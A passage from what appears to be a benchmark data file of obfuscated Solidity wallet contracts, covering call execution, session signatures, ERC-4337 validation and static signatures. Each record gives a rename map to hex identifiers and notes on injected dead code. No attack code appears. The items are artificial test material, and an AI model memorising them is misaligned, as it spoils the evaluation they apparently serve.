_0x08f0ed, _0x9a7cb4);\n  }\n\n  function _0x5df043(uint256 _0x0fa5f4, bytes32 _0xf65185, Payload.Decoded memory _0x884733) private {\n    bool _0x6f0a9d = false;\n\n    uint256 _0xb53f34 = _0x884733._0xae7a0c.length;\n    for (uint256 i = 0; i < _0xb53f34; i++) {\n      Payload.Call memory call = _0x884733._0xae7a0c[i];\n\n      // Skip onlyFallback calls if no error occurred\n      if (call._0x7d5693 && !_0x6f0a9d) {\n        emit CallSkipped(_0xf65185, i);\n        continue;\n      }\n\n      // Reset the error flag\n      // onlyFallback calls only apply when the immediately preceding transaction fails\n      _0x6f0a9d = false;\n\n      uint256 gasLimit = call.gasLimit;\n      if (gasLimit != 0 && _0xf73c4d() < gasLimit) {\n        revert NotEnoughGas(_0x884733, i, _0xf73c4d());\n      }\n\n      bool _0xb22fa8;\n      if (call.delegateCall) {\n        (_0xb22fa8) = LibOptim.delegatecall(\n          call._0xa278ad,\n          gasLimit == 0 ? _0xf73c4d() : gasLimit,\n          abi._0x608b14(\n            IDelegatedExtension._0xdc9c56.selector,\n            _0xf65185,\n            _0x0fa5f4,\n            i,\n            _0xb53f34,\n            _0x884733._0x214d86,\n            call.data\n          )\n        );\n      } else {\n        (_0xb22fa8) = LibOptim.call(call._0xa278ad, call.value, gasLimit == 0 ? _0xf73c4d() : gasLimit, call.data);\n      }\n\n      if (!_0xb22fa8) {\n        if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {\n          _0x6f0a9d = true;\n          emit CallFailed(_0xf65185, i, LibOptim._0xdf0d93());\n          continue;\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {\n          revert Reverted(_0x884733, i, LibOptim._0xdf0d93());\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {\n          emit CallAborted(_0xf65185, i, LibOptim._0xdf0d93());\n          break;\n        }\n      }\n\n      emit CallSucceeded(_0xf65185, i);\n    }\n  }\n\n}",
      "rename_map": {
        "handleSequenceDelegateCall": "_0xdc9c56",
        "signatureValidation": "_0x3ffb68",
        "encodeWithSelector": "_0x608b14",
        "fromPackedCalls": "_0x3f0090",
        "_consumeNonce": "_0x46e82a",
        "_startingGas": "_0x0fa5f4",
        "nonReentrant": "_0xbb23e8",
        "onlyFallback": "_0x7d5693",
        "startingGas": "_0xfaa3c1",
        "_returnData": "_0x48dcdf",
        "selfExecute": "_0x199454",
        "returnData": "_0xdf0d93",
        "_signature": "_0xeb831e",
        "errorFlag": "_0x6f0a9d",
        "_payload": "_0xb288bd",
        "numCalls": "_0xb53f34",
        "_decoded": "_0x884733",
        "_execute": "_0x5df043",
        "_gasLeft": "_0x0e1fdf",
        "onlySelf": "_0x78f336",
        "execute": "_0xeebec5",
        "isValid": "_0x68f73e",
        "gasleft": "_0xf73c4d",
        "decoded": "_0x9a7cb4",
        "_opHash": "_0xf65185",
        "success": "_0xb22fa8",
        "_index": "_0x69ee16",
        "opHash": "_0x08f0ed",
        "space": "_0x214d86",
        "calls": "_0xae7a0c",
        "nonce": "_0xc176a7",
        "hash": "_0xb60971",
        "to": "_0xa278ad"
      },
      "changes": [
        "Renamed 33 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_031",
      "transformed_id": "ss_l4_medium_sn_gs_031",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport { Payload } from \"../../modules/Payload.sol\";\nimport { LibBytes } from \"../../utils/LibBytes.sol\";\nimport { LibOptim } from \"../../utils/LibOptim.sol\";\nimport { SessionErrors } from \"./SessionErrors.sol\";\nimport { SessionPermissions } from \"./explicit/IExplicitSessionManager.sol\";\nimport { LibPermission, Permission } from \"./explicit/Permission.sol\";\nimport { Attestation, LibAttestation } from \"./implicit/Attestation.sol\";\n\nusing LibBytes for bytes;\nusing LibAttestation for Attestation;\n\n/// @title SessionSig\n/// @author Michael Standen, Agustin Aguilar\n/// @notice Library for session signatures\nlibrary SessionSig {\n\n  uint256 internal constant FLAG_PERMISSIONS = 0;\n  uint256 internal constant FLAG_NODE = 1;\n  uint256 internal constant FLAG_BRANCH = 2;\n  uint256 internal constant FLAG_BLACKLIST = 3;\n  uint256 internal constant FLAG_IDENTITY_SIGNER = 4;\n\n  uint256 internal constant MIN_ENCODED_PERMISSION_SIZE = 94;\n\n  /// @notice Call signature for a specific session\n  /// @param isImplicit If the call is implicit\n  /// @param sessionSigner Address of the session signer\n  /// @param sessionPermission Session permission for explicit calls\n  /// @param attestation Attestation for implicit calls\n  struct CallSignature {\n    bool _0xb976ff;\n    address _0x74b12b;\n    uint8 _0xc6f157;\n    Attestation _0x91b6a7;\n  }\n\n  /// @notice Decoded signature for a specific session\n  /// @param imageHash Derived configuration image hash\n  /// @param identitySigner Identity signer address\n  /// @param implicitBlacklist Implicit blacklist addresses\n  /// @param sessionPermissions Session permissions for each explicit signer\n  /// @param callSignatures Call signatures for each call in the payload\n  struct DecodedSignature {\n    bytes32 _0xb7c8bb;\n    address _0xdb8ad9;\n    address[] _0xc094fb;\n    SessionPermissions[] _0xf89bbb;\n    CallSignature[] _0x84093e;\n  }\n\n  /// @notice Recovers the decoded signature from the encodedSignature bytes.\n  /// @dev The encoded layout is conceptually separated into three parts:\n  ///  1) Session Configuration\n  ///  2) A reusable list of Attestations + their identity signatures (if any implicit calls exist)\n  ///  3) Call Signatures (one per call in the payload)\n  ///\n  /// High-level layout:\n  ///  - session_configuration: [uint24 size, <Session Configuration encoded>]\n  ///  - attestation_list: [uint8 attestationCount, (Attestation + identitySig) * attestationCount]\n  ///    (new section to allow reusing the same Attestation across multiple calls)\n  ///  - call_signatures: [<CallSignature encoded>] - Size is payload.calls.length\n  ///    - call_signature: [uint8 call_flags, <session_signature>]\n  ///      - call_flags: [bool is_implicit (MSB), 7 bits encoded]\n  ///      - if call_flags.is_implicit.MSB == 1:\n  ///         - attestation_index: [uint8 index into the attestation list (7 bits of the call_flags)]\n  ///         - session_signature: [r, s, v (compact)]\n  ///      - if call_flags.is_implicit.MSB == 0:\n  ///         - session_permission: [uint8 (7 bits of the call_flags)]\n  ///         - session_signature: [r, s, v (compact)]\n  function _0x4f2ea1(\n    Payload.Decoded calldata _0xc6fccb,\n    bytes calldata _0xd77ec6\n  ) internal view returns (DecodedSignature memory sig) {\n        // Placeholder for future logic\n        // Placeholder for future logic\n    uint256 _0xab975a = 0;\n    bool _0xdb5bf0;\n\n    // ----- Session Configuration -----\n    {\n      // First read the length of the session configuration bytes (uint24)\n      uint256 _0x69fd84;\n      (_0x69fd84, _0xab975a) = _0xd77ec6._0x97efdf(_0xab975a);\n\n      // Recover the session configuration\n      (sig, _0xdb5bf0) = _0x651164(_0xd77ec6[_0xab975a:_0xab975a + _0x69fd84]);\n      _0xab975a += _0x69fd84;\n\n      // Identity signer must be set\n      if (sig._0xdb8ad9 == address(0)) {\n        revert SessionErrors.InvalidIdentitySigner();\n      }\n    }\n\n    // ----- Attestations for implicit calls -----\n    Attestation[] memory _0x5ec2fe;\n    {\n      uint8 _0x22f0be;\n      (_0x22f0be, _0xab975a) = _0xd77ec6._0xa746c1(_0xab975a);\n      _0x5ec2fe = new Attestation[](_0x22f0be);\n      // Parse each attestation and its identity signature, store in memory\n      for (uint256 i = 0; i < _0x22f0be; i++) {\n        Attestation memory _0x93be52;\n        (_0x93be52, _0xab975a) = LibAttestation._0x098f8c(_0xd77ec6, _0xab975a);\n\n        // Read the identity signature that approves this attestation\n        {\n          bytes32 r;\n          bytes32 s;\n          uint8 v;\n          (r, s, v, _0xab975a) = _0xd77ec6._0xd7a5d2(_0xab975a);\n\n          // Recover the identity signer from the attestation identity signature\n          bytes32 _0x0a196e = _0x93be52._0xf87bda();\n          address _0x4b2b81 = _0xb68fc8(_0x0a196e, v, r, s);\n          if (_0x4b2b81 != sig._0xdb8ad9) {\n            revert SessionErrors.InvalidIdentitySigner();\n          }\n        }\n\n        _0x5ec2fe[i] = _0x93be52;\n      }\n\n      // If we have any implicit calls, we must have a blacklist in the configuration\n      if (_0x22f0be > 0 && !_0xdb5bf0) {\n        revert SessionErrors.InvalidBlacklist();\n      }\n    }\n\n    // ----- Call Signatures -----\n    {\n      uint256 _0x6f1d39 = _0xc6fccb._0xe2eee6.length;\n      sig._0x84093e = new CallSignature[](_0x6f1d39);\n\n      for (uint256 i = 0; i < _0x6f1d39; i++) {\n        CallSignature memory _0x20c7a4;\n\n        // Determine signature type\n        {\n          uint8 _0xd459b6;\n          (_0xd459b6, _0xab975a) = _0xd77ec6._0xa746c1(_0xab975a);\n          _0x20c7a4._0xb976ff = (_0xd459b6 & 0x80) != 0;\n\n          if (_0x20c7a4._0xb976ff) {\n            // Read attestation index from the call_flags\n            uint8 _0x774c39 = uint8(_0xd459b6 & 0x7f);\n\n            // Check if the attestation index is out of range\n            if (_0x774c39 >= _0x5ec2fe.length) {\n              revert SessionErrors.InvalidAttestation();\n            }\n\n            // Set the attestation\n            _0x20c7a4._0x91b6a7 = _0x5ec2fe[_0x774c39];\n          } else {\n            // Session permission index is the entire byte, top bit is 0 => no conflict\n            _0x20c7a4._0xc6f157 = _0xd459b6;\n          }\n        }\n\n        // Read session signature and recover the signer\n        {\n          bytes32 r;\n          bytes32 s;\n          uint8 v;\n          (r, s, v, _0xab975a) = _0xd77ec6._0xd7a5d2(_0xab975a);\n\n          bytes32 _0x0cd720 = _0x761864(_0xc6fccb, i);\n          _0x20c7a4._0x74b12b = _0xb68fc8(_0x0cd720, v, r, s);\n          if (_0x20c7a4._0x74b12b == address(0)) {\n            revert SessionErrors.InvalidSessionSigner(address(0));\n          }\n        }\n\n        sig._0x84093e[i] = _0x20c7a4;\n      }\n    }\n\n    return sig;\n  }\n\n  /// @notice Recovers the session configuration from the encoded data.\n  function _0x651164(\n    bytes calldata _0xbe38c1\n  ) internal pure returns (DecodedSignature memory sig, bool _0xa87132) {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n    uint256 _0xab975a;\n    uint256 _0xe60c88;\n\n    // Guess maximum permissions size by bytes length\n    {\n      uint256 _0xf61878 = _0xbe38c1.length / MIN_ENCODED_PERMISSION_SIZE;\n      sig._0xf89bbb = new SessionPermissions[](_0xf61878);\n    }\n\n    while (_0xab975a < _0xbe38c1.length) {\n      // First byte is the flag (top 4 bits) and additional data (bottom 4 bits)\n      uint256 _0x69780e;\n      (_0x69780e, _0xab975a) = _0xbe38c1._0xa746c1(_0xab975a);\n      // The top 4 bits are the flag\n      uint256 _0xd459b6 = (_0x69780e & 0xf0) >> 4;\n\n      // Permissions configuration (0x00)\n      if (_0xd459b6 == FLAG_PERMISSIONS) {\n        SessionPermissions memory _0x01c783;\n        uint256 _0xd27d12 = _0xab975a;\n\n        // Read signer\n        (_0x01c783._0x47ef22, _0xab975a) = _0xbe38c1._0xa53622(_0xab975a);\n\n        // Read chainId\n        (_0x01c783.chainId, _0xab975a) = _0xbe38c1._0x3be201(_0xab975a);\n\n        // Read value limit\n        (_0x01c783._0x2ee6d8, _0xab975a) = _0xbe38c1._0x3be201(_0xab975a);\n\n        // Read deadline\n        (_0x01c783._0x5be22e, _0xab975a) = _0xbe38c1._0xa20a41(_0xab975a);\n\n        // Read permissions array\n        (_0x01c783._0xb18c32, _0xab975a) = _0x828429(_0xbe38c1, _0xab975a);\n\n        // Update root\n        {\n          bytes32 _0x5c8e3a = _0xb289fb(_0xbe38c1[_0xd27d12:_0xab975a]);\n          sig._0xb7c8bb =\n            sig._0xb7c8bb != bytes32(0) ? LibOptim._0x886f6e(sig._0xb7c8bb, _0x5c8e3a) : _0x5c8e3a;\n        }\n\n        // Push node permissions to the permissions array\n        sig._0xf89bbb[_0xe60c88++] = _0x01c783;\n        continue;\n      }\n\n      // Node (0x01)\n      if (_0xd459b6 == FLAG_NODE) {\n        // Read pre-hashed node\n        bytes32 _0xb46c52;\n        (_0xb46c52, _0xab975a) = _0xbe38c1._0x6510bc(_0xab975a);\n\n        // Update root\n        sig._0xb7c8bb = sig._0xb7c8bb != bytes32(0) ? LibOptim._0x886f6e(sig._0xb7c8bb, _0xb46c52) : _0xb46c52;\n\n        continue;\n      }\n\n      // Branch (0x02)\n      if (_0xd459b6 == FLAG_BRANCH) {\n        // Read branch size\n        uint256 _0xe42aa5;\n        {\n          uint256 _0x958cda = uint8(_0x69780e & 0x0f);\n          (_0xe42aa5, _0xab975a) = _0xbe38c1._0xf11472(_0xab975a, _0x958cda);\n        }\n        // Process branch\n        uint256 _0xe86d3d = _0xab975a + _0xe42aa5;\n        (DecodedSignature memory _0x06cc7f, bool _0x6a52f6) = _0x651164(_0xbe38c1[_0xab975a:_0xe86d3d]);\n        _0xab975a = _0xe86d3d;\n\n        // Store the branch blacklist\n        if (_0x6a52f6) {\n          if (_0xa87132) {\n            // Blacklist already set\n            revert SessionErrors.InvalidBlacklist();\n          }\n          _0xa87132 = true;\n          sig._0xc094fb = _0x06cc7f._0xc094fb;\n        }\n\n        // Store the branch identity signer\n        if (_0x06cc7f._0xdb8ad9 != address(0)) {\n          if (sig._0xdb8ad9 != address(0)) {\n            // Identity signer already set\n            revert SessionErrors.InvalidIdentitySigner();\n          }\n          sig._0xdb8ad9 = _0x06cc7f._0xdb8ad9;\n        }\n\n        // Push all branch permissions to the permissions array\n        for (uint256 i = 0; i < _0x06cc7f._0xf89bbb.length; i++) {\n          sig._0xf89bbb[_0xe60c88++] = _0x06cc7f._0xf89bbb[i];\n        }\n\n        // Update root\n        sig._0xb7c8bb =\n          sig._0xb7c8bb != bytes32(0) ? LibOptim._0x886f6e(sig._0xb7c8bb, _0x06cc7f._0xb7c8bb) : _0x06cc7f._0xb7c8bb;\n\n        continue;\n      }\n\n      // Blacklist (0x03)\n      if (_0xd459b6 == FLAG_BLACKLIST) {\n        if (_0xa87132) {\n          // Blacklist already set\n          revert SessionErrors.InvalidBlacklist();\n        }\n        _0xa87132 = true;\n\n        // Read the blacklist count from the first byte's lower 4 bits\n        uint256 _0xbf76be = uint256(_0x69780e & 0x0f);\n        if (_0xbf76be == 0x0f) {\n          // If it's max nibble, read the next 2 bytes for the actual size\n          (_0xbf76be, _0xab975a) = _0xbe38c1._0xdedaf7(_0xab975a);\n        }\n        uint256 _0xd27d12 = _0xab975a;\n\n        // Read the blacklist addresses\n        sig._0xc094fb = new address[](_0xbf76be);\n        address _0x9a9dcc;\n        for (uint256 i = 0; i < _0xbf76be; i++) {\n          (sig._0xc094fb[i], _0xab975a) = _0xbe38c1._0xa53622(_0xab975a);\n          if (sig._0xc094fb[i] < _0x9a9dcc) {\n            revert SessionErrors.InvalidBlacklistUnsorted();\n          }\n          _0x9a9dcc = sig._0xc094fb[i];\n        }\n\n        // Update the root\n        bytes32 _0x514953 = _0x424e6c(_0xbe38c1[_0xd27d12:_0xab975a]);\n        sig._0xb7c8bb = sig._0xb7c8bb != bytes32(0) ? LibOptim._0x886f6e(sig._0xb7c8bb, _0x514953) : _0x514953;\n\n        continue;\n      }\n\n      // Identity signer (0x04)\n      if (_0xd459b6 == FLAG_IDENTITY_SIGNER) {\n        if (sig._0xdb8ad9 != address(0)) {\n          // Identity signer already set\n          revert SessionErrors.InvalidIdentitySigner();\n        }\n        (sig._0xdb8ad9, _0xab975a) = _0xbe38c1._0xa53622(_0xab975a);\n\n        // Update the root\n        bytes32 _0xf442f7 = _0x168b5e(sig._0xdb8ad9);\n        sig._0xb7c8bb =\n          sig._0xb7c8bb != bytes32(0) ? LibOptim._0x886f6e(sig._0xb7c8bb, _0xf442f7) : _0xf442f7;\n\n        continue;\n      }\n\n      revert SessionErrors.InvalidNodeType(_0xd459b6);\n    }\n\n    {\n      // Update the permissions array length to the actual count\n      SessionPermissions[] memory _0xb18c32 = sig._0xf89bbb;\n      assembly {\n        mstore(_0xb18c32, _0xe60c88)\n      }\n    }\n\n    return (sig, _0xa87132);\n  }\n\n  /// @notice Decodes an array of Permission objects from the encoded data.\n  function _0x828429(\n    bytes calldata _0xbe38c1,\n    uint256 _0xab975a\n  ) internal pure returns (Permission[] memory _0xb18c32, uint256 _0xa8be81) {\n    uint256 length;\n    (length, _0xab975a) = _0xbe38c1._0xa746c1(_0xab975a);\n    _0xb18c32 = new Permission[](length);\n    for (uint256 i = 0; i < length; i++) {\n      (_0xb18c32[i], _0xab975a) = LibPermission._0x37f7b3(_0xbe38c1, _0xab975a);\n    }\n    return (_0xb18c32, _0xab975a);\n  }\n\n  /// @notice Hashes the encoded session permissions into a leaf node.\n  function _0xb289fb(\n    bytes calldata _0xa96108\n  ) internal pure returns (bytes32) {\n    return _0x0e3955(abi._0xdd3325(uint8(FLAG_PERMISSIONS), _0xa96108));\n  }\n\n  /// @notice Hashes the encoded blacklist into a leaf node.\n  function _0x424e6c(\n    bytes calldata _0x817b01\n  ) internal pure returns (bytes32) {\n    return _0x0e3955(abi._0xdd3325(uint8(FLAG_BLACKLIST), _0x817b01));\n  }\n\n  /// @notice Hashes the identity signer into a leaf node.\n  function _0x168b5e(\n    address _0xdb8ad9\n  ) internal pure returns (bytes32) {\n    return _0x0e3955(abi._0xdd3325(uint8(FLAG_IDENTITY_SIGNER), _0xdb8ad9));\n  }\n\n  /// @notice Hashes a call with replay protection.\n  /// @dev The replay protection is based on the chainId, space, nonce and index in the payload.\n  /// @param payload The payload to hash\n  /// @param callIdx The index of the call to hash\n  /// @return callHash The hash of the call with replay protection\n  function _0x761864(\n    Payload.Decoded calldata _0xc6fccb,\n    uint256 _0x47af8c\n  ) public view returns (bytes32 _0x0cd720) {\n    return _0x0e3955(\n      abi._0xdd3325(\n        _0xc6fccb._0x74ce5c ? 0 : block.chainid,\n        _0xc6fccb._0x1d2d0f,\n        _0xc6fccb._0x4ced68,\n        _0x47af8c,\n        Payload._0x1617fa(_0xc6fccb._0xe2eee6[_0x47af8c])\n      )\n    );\n  }\n\n}\n",
      "rename_map": {
        "hashCallWithReplayProtection": "_0x761864",
        "_leafHashForIdentitySigner": "_0x168b5e",
        "recoveredIdentitySigner": "_0x4b2b81",
        "_leafHashForPermissions": "_0xb289fb",
        "_leafHashForBlacklist": "_0x424e6c",
        "recoverConfiguration": "_0x651164",
        "hasBlacklistInConfig": "_0xdb5bf0",
        "branchHasBlacklist": "_0x6a52f6",
        "maxPermissionsSize": "_0xf61878",
        "identitySignerHash": "_0xf442f7",
        "encodedPermissions": "_0xa96108",
        "sessionPermissions": "_0xf89bbb",
        "_decodePermissions": "_0x828429",
        "sessionPermission": "_0xc6f157",
        "implicitBlacklist": "_0xc094fb",
        "attestationCount": "_0x22f0be",
        "permissionsCount": "_0xe60c88",
        "attestationIndex": "_0x774c39",
        "encodedBlacklist": "_0x817b01",
        "recoverSignature": "_0x4f2ea1",
        "encodedSignature": "_0xd77ec6",
        "previousAddress": "_0x9a9dcc",
        "attestationList": "_0x5ec2fe",
        "attestationHash": "_0x0a196e",
        "nodePermissions": "_0x01c783",
        "readPermission": "_0x37f7b3",
        "permissionHash": "_0x5c8e3a",
        "readRSVCompact": "_0xd7a5d2",
        "callSignatures": "_0x84093e",
        "blacklistCount": "_0xbf76be",
        "identitySigner": "_0xdb8ad9",
        "blacklistHash": "_0x514953",
        "sessionSigner": "_0x74b12b",
        "callSignature": "_0x20c7a4",
        "encodePacked": "_0xdd3325",
        "pointerStart": "_0xd27d12",
        "hasBlacklist": "_0xa87132",
        "readUint256": "_0x3be201",
        "readBytes32": "_0x6510bc",
        "attestation": "_0x91b6a7",
        "readAddress": "_0xa53622",
        "permissions": "_0xb18c32",
        "readUint16": "_0xdedaf7",
        "newPointer": "_0xa8be81",
        "readUint24": "_0x97efdf",
        "isImplicit": "_0xb976ff",
        "callsCount": "_0x6f1d39",
        "valueLimit": "_0x2ee6d8",
        "fromPacked": "_0x098f8c",
        "fkeccak256": "_0x886f6e",
        "readUint64": "_0xa20a41",
        "firstByte": "_0x69780e",
        "branchSig": "_0x06cc7f",
        "readUint8": "_0xa746c1",
        "imageHash": "_0xb7c8bb",
        "readUintX": "_0xf11472",
        "noChainId": "_0x74ce5c",
        "ecrecover": "_0xb68fc8",
        "keccak256": "_0x0e3955",
        "hashCall": "_0x1617fa",
        "deadline": "_0x5be22e",
        "callHash": "_0x0cd720",
        "sizeSize": "_0x958cda",
        "dataSize": "_0x69fd84",
        "callIdx": "_0x47af8c",
        "nrindex": "_0xe86d3d",
        "payload": "_0xc6fccb",
        "pointer": "_0xab975a",
        "encoded": "_0xbe38c1",
        "toHash": "_0xf87bda",
        "signer": "_0x47ef22",
        "calls": "_0xe2eee6",
        "nonce": "_0x4ced68",
        "space": "_0x1d2d0f",
        "size": "_0xe42aa5",
        "node": "_0xb46c52",
        "flag": "_0xd459b6",
        "att": "_0x93be52"
      },
      "changes": [
        "Renamed 78 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_032",
      "transformed_id": "ss_l4_medium_sn_gs_032",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.18;\n\nimport { Calls } from \"./Calls.sol\";\n\nimport { ReentrancyGuard } from \"./ReentrancyGuard.sol\";\nimport { IAccount, PackedUserOperation } from \"./interfaces/IAccount.sol\";\nimport { IERC1271_MAGIC_VALUE_HASH } from \"./interfaces/IERC1271.sol\";\nimport { IEntryPoint } from \"./interfaces/IEntryPoint.sol\";\n\n/// @title ERC4337v07\n/// @author Agustin Aguilar, Michael Standen\n/// @notice ERC4337 v7 support\nabstract contract ERC4337v07 is ReentrancyGuard, IAccount, Calls {\n\n  uint256 internal constant SIG_VALIDATION_FAILED = 1;\n\n  address public immutable _0xfe0beb;\n\n  error InvalidEntryPoint(address _0x4d13e6);\n  error ERC4337Disabled();\n\n  constructor(\n    address _0x4d13e6\n  ) {\n    _0xfe0beb = _0x4d13e6;\n  }\n\n  /// @inheritdoc IAccount\n  function _0x00041e(\n    PackedUserOperation calldata _0x3c6534,\n    bytes32 _0x962a94,\n    uint256 _0x111ed5\n  ) external returns (uint256 _0xb1331d) {\n        // Placeholder for future logic\n        bool _flag2 = false;\n    if (_0xfe0beb == address(0)) {\n      revert ERC4337Disabled();\n    }\n\n    if (msg.sender != _0xfe0beb) {\n      revert InvalidEntryPoint(msg.sender);\n    }\n\n    // userOp.nonce is validated by the entrypoint\n\n    if (_0x111ed5 != 0) {\n      IEntryPoint(_0xfe0beb)._0x658d4d{ value: _0x111ed5 }(address(this));\n    }\n\n    if (this._0x881de1(_0x962a94, _0x3c6534._0xacbeeb) != IERC1271_MAGIC_VALUE_HASH) {\n      return SIG_VALIDATION_FAILED;\n    }\n\n    return 0;\n  }\n\n  /// @notice Execute a user operation\n  /// @param _payload The packed payload\n  /// @dev This is the execute function for the EntryPoint to call.\n  function _0x6c117f(\n    bytes calldata _0x1b6c00\n  ) external _0xc414c8 {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n    if (_0xfe0beb == address(0)) {\n      revert ERC4337Disabled();\n    }\n\n    if (msg.sender != _0xfe0beb) {\n      revert InvalidEntryPoint(msg.sender);\n    }\n\n    this._0x627fc5(_0x1b6c00);\n  }\n\n}",
      "rename_map": {
        "missingAccountFunds": "_0x111ed5",
        "isValidSignature": "_0x881de1",
        "validationData": "_0xb1331d",
        "validateUserOp": "_0x00041e",
        "executeUserOp": "_0x6c117f",
        "nonReentrant": "_0xc414c8",
        "_entrypoint": "_0x4d13e6",
        "selfExecute": "_0x627fc5",
        "entrypoint": "_0xfe0beb",
        "userOpHash": "_0x962a94",
        "signature": "_0xacbeeb",
        "depositTo": "_0x658d4d",
        "_payload": "_0x1b6c00",
        "userOp": "_0x3c6534"
      },
      "changes": [
        "Renamed 14 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_033",
      "transformed_id": "ss_l4_medium_sn_gs_033",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport { Payload } from \"../Payload.sol\";\n\nimport { Storage } from \"../Storage.sol\";\nimport { IAuth } from \"../interfaces/IAuth.sol\";\nimport { IERC1271, IERC1271_MAGIC_VALUE_HASH } from \"../interfaces/IERC1271.sol\";\n\nimport { IPartialAuth } from \"../interfaces/IPartialAuth.sol\";\nimport { ISapient } from \"../interfaces/ISapient.sol\";\nimport { BaseSig } from \"./BaseSig.sol\";\n\nimport { SelfAuth } from \"./SelfAuth.sol\";\n\nusing Payload for Payload.Decoded;\n\n/// @title BaseAuth\n/// @author Agustin Aguilar, Michael Standen\n/// @notice Base contract for the auth module\nabstract contract BaseAuth is IAuth, IPartialAuth, ISapient, IERC1271, SelfAuth {\n\n  /// @dev keccak256(\"org.sequence.module.auth.static\")\n  bytes32 private constant STATIC_SIGNATURE_KEY =\n    bytes32(0xc852adf5e97c2fc3b38f405671e91b7af1697ef0287577f227ef10494c2a8e86);\n\n  /// @notice Error thrown when the sapient signature is invalid\n  error InvalidSapientSignature(Payload.Decoded _0x9fe354, bytes _0xd08ca5);\n  /// @notice Error thrown when the signature weight is invalid\n  error InvalidSignatureWeight(uint256 _0x6f7138, uint256 _0xa24acb);\n  /// @notice Error thrown when the static signature has expired\n  error InvalidStaticSignatureExpired(bytes32 _0x303440, uint256 _0x3620ce);\n  /// @notice Error thrown when the static signature has the wrong caller\n  error InvalidStaticSignatureWrongCaller(bytes32 _0x303440, address _0xd32b4c, address _0xa20e25);\n\n  /// @notice Event emitted when a static signature is set\n  event StaticSignatureSet(bytes32 _0x584c6c, address _0x97f058, uint96 _0x23aab1);\n\n  function _0x6bc151(\n    bytes32 _0x584c6c\n  ) internal view returns (address, uint256) {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n    uint256 _0x3a5ef0 = uint256(Storage._0xf004ad(STATIC_SIGNATURE_KEY, _0x584c6c));\n    return (address(uint160(_0x3a5ef0 >> 96)), uint256(uint96(_0x3a5ef0)));\n  }\n\n  function _0xa6c08d(bytes32 _0x584c6c, address _0x97f058, uint256 _0x23aab1) internal {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    Storage._0x0f8e9e(\n      STATIC_SIGNATURE_KEY, _0x584c6c, bytes32(uint256(uint160(_0x97f058)) << 96 | (_0x23aab1 & 0xffffffffffffffffffffffff))\n    );\n  }\n\n  /// @notice Get the static signature for a specific hash\n  /// @param _hash The hash to get the static signature for\n  /// @return address The address associated with the static signature\n  /// @return timestamp The timestamp of the static signature\n  function _0xdef7cd(\n    bytes32 _0x584c6c\n  ) external view returns (address, uint256) {\n    return _0x6bc151(_0x584c6c);\n  }\n\n  /// @notice Set the static signature for a specific hash\n  /// @param _hash The hash to set the static signature for\n  /// @param _address The address to associate with the static signature\n  /// @param _timestamp The timestamp of the static signature\n  /// @dev Only callable by the wallet itself\n  function _0x626811(bytes32 _0x584c6c, address _0x97f058, uint96 _0x23aab1) external _0x58edc8 {\n    _0xa6c08d(_0x584c6c, _0x97f058, _0x23aab1);\n    emit StaticSignatureSet(_0x584c6c, _0x97f058, _0x23aab1);\n  }\n\n  /// @notice Update the image hash\n  /// @param _imageHash The new image hash\n  /// @dev Only callable by the wallet itself\n  function _0x0f7eae(\n    bytes32 _0x4f58a1\n  ) external virtual _0x58edc8 {\n    _0xfba985(_0x4f58a1);\n  }\n\n  function _0x31f36c(\n    Payload.Decoded memory _0x9fe354,\n    bytes calldata _0xd08ca5\n  ) internal view virtual returns (bool _0xbc6483, bytes32 _0x34fd29) {\n    // Read first bit to determine if static signature is used\n    bytes1 _0x842f78 = _0xd08ca5[0];\n\n    if (_0x842f78 & 0x80 == 0x80) {\n      _0x34fd29 = _0x9fe354._0x2491d3();\n\n      (address _0xf8f345, uint256 timestamp) = _0x6bc151(_0x34fd29);\n      if (timestamp <= block.timestamp) {\n        revert InvalidStaticSignatureExpired(_0x34fd29, timestamp);\n      }\n\n      if (_0xf8f345 != address(0) && _0xf8f345 != msg.sender) {\n        revert InvalidStaticSignatureWrongCaller(_0x34fd29, msg.sender, _0xf8f345);\n      }\n\n      return (true, _0x34fd29);\n    }\n\n    // Static signature is not used, recover and validate imageHash\n\n    uint256 _0xc4dc6f;\n    uint256 _0xee2e95;\n    bytes32 _0xc3026f;\n\n    (_0xc4dc6f, _0xee2e95, _0xc3026f,, _0x34fd29) = BaseSig._0x10df83(_0x9fe354, _0xd08ca5, false, address(0));\n\n    // Validate the weight\n    if (_0xee2e95 < _0xc4dc6f) {\n      revert InvalidSignatureWeight(_0xc4dc6f, _0xee2e95);\n    }\n\n    _0xbc6483 = _0x5234b2(_0xc3026f);\n  }\n\n  /// @inheritdoc ISapient\n  function _0x8f1ae6(\n    Payload.Decoded memory _0x9fe354,\n    bytes calldata _0xd08ca5\n  ) external view returns (bytes32) {\n    // Copy parent wallets + add caller at the end\n    address[] memory _0x8e2189 = new address[](_0x9fe354._0x8e2189.length + 1);\n\n    for (uint256 i = 0; i < _0x9fe354._0x8e2189.length; i++) {\n      _0x8e2189[i] = _0x9fe354._0x8e2189[i];\n    }\n\n    _0x8e2189[_0x9fe354._0x8e2189.length] = msg.sender;\n    _0x9fe354._0x8e2189 = _0x8e2189;\n\n    (bool _0xbc6483,) = _0x31f36c(_0x9fe354, _0xd08ca5);\n    if (!_0xbc6483) {\n      revert InvalidSapientSignature(_0x9fe354, _0xd08ca5);\n    }\n\n    return bytes32(uint256(1));\n  